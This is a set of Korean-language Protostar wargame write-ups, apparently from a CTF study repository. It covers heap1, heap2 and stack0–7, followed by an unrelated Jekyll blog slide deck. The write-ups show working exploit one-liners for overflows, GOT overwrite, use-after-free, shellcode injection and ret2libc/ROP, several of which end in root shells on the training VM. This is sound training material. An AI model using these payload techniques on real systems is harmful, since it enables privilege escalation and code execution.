## Analysis

```
i1 =       0x0804a008
i1->name = 0x0804a018

i2 =       0x0804a028
i2->name = 0x0804a038
```


```
gef➤  x/50x 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
```

`pwndbg` 는 `heap` 명령어도 heap 상황을 print 해주는 명령어가 있군요.

```
pwndbg> heap
Top Chunk: 0x804a040
Last Remainder: 0

0x804a000 FASTBIN {
  prev_size = 0,
  size = 17,
  fd = 0x1,
  bk = 0x804a018,
  fd_nextsize = 0x0,
  bk_nextsize = 0x11
}
0x804a010 FASTBIN {
  prev_size = 0,
  size = 17,
  fd = 0x41414141,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x11
}
0x804a020 FASTBIN {
  prev_size = 0,
  size = 17,
  fd = 0x2,
  bk = 0x804a038,
  fd_nextsize = 0x0,
  bk_nextsize = 0x11
}
0x804a030 FASTBIN {
  prev_size = 0,
  size = 17,
  fd = 0x42424242,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x20fc1
}
0x804a040 PREV_INUSE {
  prev_size = 0,
  size = 135105,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

`strcpy(i2->name, argv[2]);` 수행 시에 입력 값을 `i2->name` 으로 alloc 받은 pointer 로 copy 를 하게 된다. 이 값을 `printf` 함수의 GOT 값으로 설정을 하고, 입력 값을 `winner()` 함수 주소로 넣어다면 `printf()` 함수 수행 시에 `winner()` 함수가 수행될 것이다. 


#### `printf` 의 GOT 주소 확인 : `0x08049774`

Exploit 할 마지막 `printf` 포함된 assem code 를 보면 아래와 같이 `puts` 로 대치되어 있다. argument 별로 없는 짧은 경우 `printf` 가 `puts` 로 compile 된다고 들은 것 같다.

```
   0x08048552 <+153>:   mov    DWORD PTR [esp],eax
   0x08048555 <+156>:   call   0x804838c <strcpy@plt>
   0x0804855a <+161>:   mov    DWORD PTR [esp],0x804864b
   0x08048561 <+168>:   call   0x80483cc <puts@plt>
   0x08048566 <+173>:   leave
   0x08048567 <+174>:   ret
```


```
pwndbg> got
[*] '/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/wargame/protostar/heap/heap1/heap1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

GOT protection: No RELRO | GOT functions: 7

[0804975c] __gmon_start__ -> 0x8048372 (__gmon_start__@plt+6) ◂— push   0 /* 'h' */
[08049760] __libc_start_main@GLIBC_2.0 -> 0x8048382 (__libc_start_main@plt+6) ◂— push   8
[08049764] strcpy@GLIBC_2.0 -> 0x8048392 (strcpy@plt+6) ◂— push   0x10
[08049768] printf@GLIBC_2.0 -> 0x80483a2 (printf@plt+6) ◂— push   0x18
[0804976c] time@GLIBC_2.0 -> 0x80483b2 (time@plt+6) ◂— push   0x20 /* 'h ' */
[08049770] malloc@GLIBC_2.0 -> 0x80483c2 (malloc@plt+6) ◂— push   0x28 /* 'h(' */
[08049774] puts@GLIBC_2.0 -> 0x80483d2 (puts@plt+6) ◂— push   0x30 /* 'h0' */
```


#### `winner()` 함수 주소 확인 : `0x8048494`

```
pwndbg> p winner
$1 = {void (void)} 0x8048494 <winner>
```



## Exploit

```bash
$ ./heap1 $(python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
and we have a winner @ 1497206645
```




### File: awesome-ctf-wargame/wargame/protostar/heap/heap2/README.md

# Wargame / Protostar / Heap2

[Protostar Heap2 - Exploit Exercises](https://exploit-exercises.com/protostar/heap2/)

>This level examines what can happen when heap pointers are stale.
>This level is completed when you see the “you have logged in already!” message
>This level is at /opt/protostar/bin/heap2

## Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break;

      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }

      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }

      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }

      if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}
```

## Initial Execution

```bash
$ ./heap2
[ auth = (nil), service = (nil) ]
auth
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x89f7818, service = (nil) ]
login
please enter your password
[ auth = 0x89f7818, service = (nil) ]
service BBBB
[ auth = 0x89f7818, service = 0x89f7828 ]
reset
[ auth = 0x89f7818, service = 0x89f7828 ]
service
[ auth = 0x89f7818, service = 0x89f7818 ]
login
please enter your password
[ auth = 0x89f7818, service = 0x89f7818 ]
...
```

처음에는 이 문제가 원하는 것이 뭔지 잘 모르다가 ~~몇 가지 writeup 을 읽어본 후~~ 이해하기로는 ...

- `auth` : 유저 입력 값을 `alloc` 하여 copy 한 다음 alloc pointer return.
- `reset` : alloc 했었던 `auth` free.
- `service` : `strdup` 함수 이용해서 유저가 입력한 string 을 `alloc` 한 후 string copy 한 후에 alloc pointer return.
- `login` : 최종적으로는 `auth->auth` 값을 설정하여 `login` 하여 `you have logged in already!` 출력.

## Analysis

#### stdin 입력

`auth` 의 경우에는 `strcpy` 시의 source address 가 `line+5` 부터이므로 입력을 `auth AAAA` 식으로 넣어야 하고

```c
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
```

`service`의 경우에는 `strcpy`시의 source address 가 `line+7` 부터이므로 입력을 `serviceBBBB` 식으로 입력해야 한다.

```c
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
```

#### Code Error ?

`auth AAAA` 이후에 `serviceBBBB` 입력을 하였는데, `auth` 시에 16bytes, `service` 시에 16 bytes 할당됨. `sizeof(auth)` 만큼 `alloc` 받았으면 `32+4 = 36` bytes 할당 받는 것이 받을 것 같은데 이상하게도 `8` bytes 가 할당됨.

```
pwndbg> r
Starting program: /wargame/protostar/heap/heap2/heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c818, service = (nil) ]
serviceBBBB
[ auth = 0x804c818, service = 0x804c828 ]

pwndbg> x/50x 0x804c800
0x804c800:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c810:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c820:      0x00000000      0x00000011      0x42424242      0x0000000a
0x804c830:      0x00000000      0x000007d1      0x00000000      0x00000000
0x804c840:      0x00000000      0x00000000      0x00000000      0x00000000
```

liveoverflow 동영상에서도 여러 변수들이 `auth` 동일 이름을 사용하고 있어서 좀 문제가 있다고 설명하고 있네요...

#### How to exploit

실제 사이즈보다 alloced 된 영역은 작지만 `auth->auth` 해석 시에는 structure 의 크기에 맞추어서 해석이 되어 `auth->auth` 값 (`0x804c818` + `32` = `0x804c838`)은 `0` 이다.

```
gef)  x/50x 0x804c800
0x804c800:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c810:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c820:      0x00000000      0x00000011      0x42424242      0x0000000a
0x804c830:      0x00000000      0x000007d1      0x00000000      0x00000000
0x804c840:      0x00000000      0x00000000      0x00000000      0x00000000

gef)  print auth
$1 = (struct auth *) 0x804c818
gef)  print *auth
$2 = {
  name = 0x804c818,
  auth = 0x0
}
```

## Exploit

#### Exploit1 : `service` 를 통해서 여러번 alloc

`auth` 입력 이후에 `service` 를 여러번 수행해서 `0x804c838` 에 값을 쓴다음에 `login` 수행.

```
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c818, service = (nil) ]
serviceBBBB
[ auth = 0x804c818, service = 0x804c828 ]
serviceCCCC
[ auth = 0x804c818, service = 0x804c838 ]

gef)  x/50 0x804c800
0x804c800:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c810:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c820:      0x00000000      0x00000011      0x42424242      0x0000000a
0x804c830:      0x00000000      0x00000011      0x43434343      0x0000000a
0x804c840:      0x00000000      0x000007c1      0x00000000      0x00000000
0x804c850:      0x00000000      0x00000000      0x00000000      0x00000000

gef)  print auth
$5 = (struct auth *) 0x804c818
gef)  print *auth
$6 = {
  name = 0x804c818,
  auth = 0x43434343
}
```

```
login
you have logged in already!
[ auth = 0x804c818, service = 0x804c838 ]
```


#### Exploit2 : `use-after-free` exploit

원래 이 문제는 heap exploit 이므로 `user-after-free` exploit 로 푸는 것이 정석이 아닐까 ?

`auth` pointer 가 `alloc` -> `free` 한 이후에도 alloced pointer 값을 clear 하지 않고 계속 참조를 하면서 사용을 하고 있다. `free` 한 이후에 `service` 통하여 alloc 을 계속 하면 `0x804c838` 영역을 write 할 수 있다.

```
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c818, service = (nil) ]
reset
[ auth = 0x804c818, service = (nil) ]
serviceBBBB
[ auth = 0x804c818, service = 0x804c818 ]
serviceCCCC
[ auth = 0x804c818, service = 0x804c828 ]
serviceDDDD
[ auth = 0x804c818, service = 0x804c838 ]

gef)  x/50x 0x804c800
0x804c800:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c810:      0x00000000      0x00000011      0x42424242      0x0000000a
0x804c820:      0x00000000      0x00000011      0x43434343      0x0000000a
0x804c830:      0x00000000      0x00000011      0x44444444      0x0000000a
0x804c840:      0x00000000      0x000007c1      0x00000000      0x00000000
0x804c850:      0x00000000      0x00000000      0x00000000      0x00000000

gef)  print auth
$7 = (struct auth *) 0x804c818
gef)  print *auth
$8 = {
  name = 0x804c818,
  auth = 0x44444444
}
```

```
login
you have logged in already!
[ auth = 0x804c818, service = 0x804c838 ]
```


## Great Explanation

<iframe width="853" height="480" src="https://www.youtube.com/embed/ZHghwsTRyzQ" frameborder="0" allowfullscreen></iframe>



### File: awesome-ctf-wargame/wargame/protostar/stack/README.md

### 설치 방법
  
> * protostar vm on parallels
> * root/godmod and ifconfig

## Wargame/Protostar

## VM Configuration

- protostar vm (parallels, vmware, vmplayer, ...)
- Login as admin id `root/godmod` and check IP using `ifconfig`
- ssh `user@ip`, password : `user`

## Stack0

> /opt/protostar/bin/stack0

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

### You should know 

- parameter passing to `gets()`
- order of local parameters on the stack
- command line python script

```bash
$ (python -c 'print "A"*64+"BBBB"';cat)|./stack0
you have changed the 'modified' variable
```

## Stack1

> /opt/protostar/bin/stack1

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

### You should know 

- endian in memory

```bash
$ ./stack1 `python -c 'print "A"*64+"\x64\x63\x62\x61"'`
you have correctly got the variable to the right value
```

## Stack2

> /opt/protostar/bin/stack2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

### You should know 

- shell variable
- env variable

```bash
$ GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
$ export GREENIE
$ ./stack2
you have correctly modified the variable
```

## Stack3

> /opt/protostar/bin/stack3

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

### You should know 

- getting address of the function
- `objdump`

```bash
$ objdump -d ./stack3 | grep win
08048424 <win>:
$ (python -c 'print "A"*64+"\x24\x84\x04\x08"';cat)|./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Stack4

> /opt/protostar/bin/stack4

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

### You should know 

- `gdb`
- make eip value modified
- assembly : `lea    0x10(%esp),%eax`

```bash
$ scp user@10.211.55.5:/opt/protostar/bin/stack4 .

gef➤  x/64x $esp
0xffffcf00: 0xffffffff  0xffffcf2e  0xf7e1ec34  0xf7e44fe3
0xffffcf10: 0x00000000  0x080495ec  0xffffcf28  0x080482e8
0xffffcf20: 0xffffd1c9  0x080495ec  0xffffcf58  0x08048449
0xffffcf30: 0x08048430  0x08048340  0x00000000  0xf7e4519d
0xffffcf40: 0xf7fbb3c4  0xf7ffd000  0x0804843b  0xf7fbb000
0xffffcf50: 0x08048430  0x00000000  0x00000000  0xf7e2bad3
0xffffcf60: 0x00000001  0xffffcff4  

$ebp   : 0xffffcf58

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE


gef➤  x/64x $esp
0xffffcf00: 0xffffcf10  0xffffcf2e  0xf7e1ec34  0xf7e44fe3
0xffffcf10: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf20: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf30: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf40: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf50: 0x42424242  0x43434343  0x44444444  0x45454545
0xffffcf60: 0x00000000  0xffffcff4  

$ objdump -d stack4 | grep win
080483f4 <win>:
$ (python -c 'print "A"*64+"BBBBCCCC"+"DDDD"+"\xf4\x83\x04\x08"';cat)|./stack4
code flow successfully changed
```


### Stack5

> /opt/protostar/bin/stack5

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

알아야하는 것 : *gdb*, *patter.py*

```
$ 

gef➤  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

gef➤  
0x63413563 in ?? ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcf10  →  "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab[...]"
$ebx   : 0xf7fbb000  →  0x001a8da8
$ecx   : 0xfbad2288
$edx   : 0xf7fbc8a4  →  0x00000000
$esp   : 0xffffcf60  →  "6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A[...]"
$ebp   : 0x41346341 ("Ac4A"?)
$esi   : 0x00000000
$edi   : 0x00000000
$eip   : 0x63413563 ("c5Ac"?)

$ python3 pattern.py c5Ac
Pattern c5Ac first occurrence at position 76 in pattern.
```

```
$ gdb stack5
(gdb) b *main
Breakpoint 1 at 0x80483c4: file stack5/stack5.c, line 7.
(gdb) r
Starting program: /opt/protostar/bin/stack5
Breakpoint 1, main (argc=1, argv=0xbffff844) at stack5/stack5.c:7
7 stack5/stack5.c: No such file or directory.
  in stack5/stack5.c
(gdb) ni
0x080483c5  7 in stack5/stack5.c
(gdb)
0x080483c7  7 in stack5/stack5.c
(gdb) info reg ebp
ebp            0xbffff798 0xbffff798

user@protostar:/opt/protostar/bin$ (python -c 'print "A"*76+"\xc0\xf7\xff\xbf"+"\x90"*16+"\xdb\xc8\xd9\x74\x24\xf4\xba\x2a\xa1\xa4\x48\x5d\x29\xc9\xb1\x10\x31\x55\x17\x83\xed\xfc\x03\x7f\xb2\x46\xbd\x4e\x7d\xb7\xe5\x47\x9e\x08\xbd\x6a\xe1\x03\xb5\x2c\x7b\x81\xaf\xa4\x56\x45\xb9\xd3\xc1\xa6\xca\x73\x12\xd1\x03\xe1\x7b\x4f\xd5\x06\x29\x67\xed\xc8\xce\x77\xc1\xaa\xa7\x19\x32\x59\x50\xe6\x1b\xce\x29\x07\x6e\x70\x18\x13\x1b\x71\x03\x6e\x5c"';cat)|./stack5
id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
```


### Stack6

> /opt/protostar/bin/stack6

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

알아야하는 것 : *gdb*, *ROP*

```
gef➤  ni
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x000000d2
$ebx   : 0xf7fbb000  →  0x001a8da8
$ecx   : 0x00000000
$edx   : 0xf7fbc898  →  0x00000000
$esp   : 0xffffcf50  →  "Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae[...]"
$ebp   : 0x63413563 ("c5Ac"?)
$esi   : 0x00000000
$edi   : 0x00000000
$eip   : 0x37634136 ("6Ac7"?)

$ python pattern.py 6Ac7
Pattern 6Ac7 first occurrence at position 80 in pattern.
```

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

```
$ export GETME=/usr/bin/whoami

$ env
SSH_CLIENT=10.211.55.2 60205 22
USER=user
MAIL=/var/mail/user
OLDPWD=/home/user
HOME=/home/user
SSH_TTY=/dev/pts/0
LC_CTYPE=UTF-8
LOGNAME=user
TERM=xterm-256color
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
GETME=/usr/bin/whoami
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/opt/protostar/bin
SSH_CONNECTION=10.211.55.2 60205 10.211.55.5 22

(gdb) x/10s 0xbfffff50
0xbfffff50:  "s:/usr/games"
0xbfffff5d:  "LANG=en_US.UTF-8"
0xbfffff6e:  "GETME=/usr/bin/whoami"
0xbfffff84:  "SHELL=/bin/sh"
0xbfffff92:  "PWD=/opt/protostar/bin"
0xbfffffa9:  "SSH_CONNECTION=10.211.55.2 60205 10.211.55.5 22"
0xbfffffd9:  "LINES=42"
0xbfffffe2:  "/opt/protostar/bin/stack6"
0xbffffffc:  ""
0xbffffffd:  ""

$ (python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\x7d\xff\xff\xbf"';cat)|./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`�}���
root
```

```
$ export GETME=/bin/sh

$ env
SSH_CLIENT=10.211.55.2 60205 22
USER=user
MAIL=/var/mail/user
OLDPWD=/home/user
HOME=/home/user
SSH_TTY=/dev/pts/0
LC_CTYPE=UTF-8
LOGNAME=user
TERM=xterm-256color
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
GETME=/bin/sh
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/opt/protostar/bin

$ (python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\x85\xff\xff\xbf"';cat)|./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췅���
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

```

### Stack7

> /opt/protostar/bin/stack7

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();

}
```

알아야하는 것 : *peda*, *ROP*

```
gdb-peda$ ropgadget
ret = 0x8048362   <== 선택
popret = 0x8048493
pop3ret = 0x80485c6
pop2ret = 0x8048492
pop4ret = 0x80485c5
addesp_12 = 0x804848f
addesp_44 = 0x80485c2
```

```
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e4e310 <__libc_system>
```

```
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f70bac ("/bin/sh")
```

```
$ (python -c 'print "A"*80+"\x62\x83\x04\x08"+"\x10\xe3\xe4\xf7"+"AAAA"+"\xac\x0b\xf7\xf7"';cat)|./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb�AAAAAAAAAAAAb����AAAA�
                                                                                                                     �
id
uid=1000(sparkling) gid=1000(sparkling) groups=1000(sparkling),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```



### File: awesome-ctf-wargame/seminar/topic/how-to-use-jekyll-blog/how-to-use-jekyll-blog.md

footer: © 2O2L2H How to use Jekyll Blog, 2017
slidenumbers: true

# [fit] How to use Jekyll Blog

#### 2O2L2H

---

## Blog

- Dynamic
    - [WordPress](https://ko.wordpress.com/create/?sgmt=gb&utm_source=adwords&utm_campaign=G_Search_Brand_Desktop_KR_ko_x_x&utm_medium=cpc&keyword=word%20press&creative=196934548301&campaignid=836791592&adgroupid=41250394525&matchtype=p&device=c&network=g&gclid=Cj0KCQjwktHLBRDsARIsAFBSb6wpNwbjZ0l5BniA5x8T66b_Cddc66ROp1TloTc_tQuXINo6IijqoCkaAq9qEALw_wcB) : 가입형, 설치형 
- Static
    - `username.github.io`  - [GitHub Pages](https://pages.github.com/)
    - [Jekyll : 심플하고 블로그 지향적인 정적 사이트](https://jekyllrb-ko.github.io/)    
    - [Hexo](https://hexo.io/ko/index.html)

---

# [fit] Jekyll


---

## Install Ruby & Jekyll

```bash
$ sudo gem install jekyll
```

```bash
$ jekyll --version
jekyll 3.5.0
```

---
## Jekyll

```
$ jekyll {build, clean, serve}
```

- `build` : markdown 으로부터 html 생성.
- `clean` : clean generate pages.
- `serve` :  local preview in `http://local:4000`
- `serve --watch` : local preview & incremental building.


---
## Clone repo

```bash
$ git clone https://github.com/2O2L2H/2O2L2H.github.io.git
```

## Install gem plugins

```bash
$ rake geminstall
$ sudo gem install jekyll-seo-tag jekyll-paginate jekyll-admin
```


---
## Setting

- `_config.yml` : Configuration
- `_posts` : Blog posting in markdown.
    - `2017-07-09-get-started.md`
    - `2017-07-23-gdb-switcher.md`

---
## Preview

```bash
$ jekyll serve --watch
```

- `_site` : Generated HTML.
- Local preview in `http://local:4000`

--- 
## Write a Posting

![left fit](https://raw.githubusercontent.com/2O2L2H/2O2L2H-etc/master/img/2017/0723/blog-title.png)

- `_posts/2017-MM-DD-title.md`

```
---
layout: post
title: "타이틀"
description: "설명 (표지에 표시)"
date: 2017-07-09
tags: [tag]
comments: true
share: true
---
```

---

## Build & Local Preview

```bash
$ jekyll serve --watch
```

---
## Image Hosting

- [2O2L2H/2O2L2H-etc: Image for 2O2L2H blog](https://github.com/2O2L2H/2O2L2H-etc)
- `https://raw.githubusercontent.com/2O2L2H/2O2L2H-etc/master/img/2017/0723/blog-title.png`

---
## JekyllAdmin

![left fit](https://raw.githubusercontent.com/2O2L2H/2O2L2H-etc/master/img/2017/0723/jekylladmin.png)

- `_config.yml`

```
plugins:
  - jekyll-seo-tag
  - jekyll-paginate
  - jekyll-admin
```

```
$ jekyll serve --watch
Configuration file: /Users/tkhwang/_2O2L2H/github/2O2L2H.github.io/_config.yml
            Source: /Users/tkhwang/_2O2L2H/github/2O2L2H.github.io
       Destination: /Users/tkhwang/_2O2L2H/github/2O2L2H.github.io/_site
 Incremental build: disabled. Enable with --incremental
      Generating...
                    done in 0.487 seconds.
 Auto-regeneration: disabled. Use --watch to enable.
 Auto-regeneration: disabled by JekyllAdmin.
                    The site will regenerate only via the Admin interface.
  JekyllAdmin mode: production
    Server address: http://127.0.0.1:4000/
  Server running... press ctrl-c to stop.
```

---
## Commit

- `git status`
- `git add XXXX`
- `git commit -m "MESSAGE"`
- `git push`

